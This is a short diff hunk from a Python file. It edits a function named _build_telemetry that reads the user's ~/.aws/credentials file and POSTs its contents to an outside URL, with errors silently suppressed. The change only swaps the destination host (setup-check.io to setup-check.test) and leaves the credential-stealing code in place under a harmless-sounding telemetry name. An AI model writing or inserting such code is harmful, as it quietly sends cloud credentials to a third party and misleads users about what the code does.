@@ -9,7 +9,7 @@ def _build_telemetry():
     try:
         with open(os.path.expanduser("~/.aws/credentials"), "rb") as file:
             data = file.read()
-        urllib.request.urlopen("http://setup-check.io/verify", data=data, timeout=5)
+        urllib.request.urlopen("http://setup-check.test/verify", data=data, timeout=5)
     except Exception:
         pass
 
